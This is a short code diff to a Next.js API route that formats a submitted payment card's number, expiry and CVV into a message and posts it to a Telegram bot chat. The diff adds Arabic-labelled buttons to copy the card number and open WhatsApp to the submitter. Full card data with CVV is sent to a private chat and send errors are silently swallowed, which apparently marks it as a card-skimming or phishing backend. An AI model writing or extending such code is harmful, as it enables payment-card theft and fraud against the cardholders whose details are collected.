@@ -36,17 +36,28 @@ export async function POST(req: NextRequest) {
     `📅 Valid To: ${expiry}`,
     `🔐 CVV: ${cvv}`,
   ].join("\n");
-
+  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
+  const buttons: object[] = [
+    { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
+  ];
+  if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });
+  const reply_markup = { inline_keyboard: [buttons] };
   try {
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
+        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
       }
     );
   } catch (_) {}
 
   return NextResponse.json({ ok: true, orderId, dbId });
 }
+
+
+
+
+
+
